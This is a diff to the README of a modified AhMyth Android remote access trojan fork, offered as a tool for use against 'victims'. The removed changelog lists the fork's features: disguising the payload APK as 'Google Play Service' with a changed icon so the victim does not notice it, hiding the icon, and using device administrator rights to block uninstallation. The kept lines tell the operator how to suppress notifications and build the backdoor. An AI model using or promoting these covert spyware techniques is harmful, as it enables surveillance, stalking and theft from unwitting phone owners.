@@ -21,17 +21,9 @@ AhMyth is an popular open source android rat. But the official AhMyth contains m
 - Built In APK Builder
 - Camera Access
 
-## What's new and fixed bugs
-- Fetch files bug fixes
-- Device administrator permission added that normal users can not uninstall the payload
-- Fetching victim's location bug fixes
-- The name of the apk file has been changed to Google Play Service so that the victim does not understand that it is a payload.
-- Also has been changed the apk icon.
-- Android 12 supported
-- App icon will hide if the victim's phone's android version is below android 10. (That's why device admin permission added to prevent uninstallation)
-
 ## Notice
- - Due to the background limitation of Android 8 or higher, the started service has been removed and the foreground service has been added. So you should turn off the application's notification from the settings. If victim's phone is under Android 8 then you can skip this step.
+ - Due to the background limitation of Android 8 or higher, the started service has been removed and the foreground service has been added. So you should turn off the application's notification from the settings.
+ - Gerate the payload from source code by using Android Studio to get the latest uptdated version of the payload.
 
 ## Prerequisites
 - Java 8 (to generate apk backdoor)
@@ -57,7 +49,7 @@ AhMyth is an popular open source android rat. But the official AhMyth contains m
  ##### Prerequisites
  - Download binary for windows x64 from <a href="https://hidden-pirates.blogspot.com/2021/01/AhMyth-Modified-Version-By-Hidden-Pirates.html">here.</a>
  - Java 8 (to generate apk backdoor)
- 
+  
 ## Screenshots
 
 <img width="600" style="max-width: 100%;" src="https://camo.githubusercontent.com/ee646819f13b7aa148ff2e15e55b4fd6d5406729f52723528956f55201389dcd/68747470733a2f2f692e6962622e636f2f363439383037772f73706c6173682e706e67" /> 
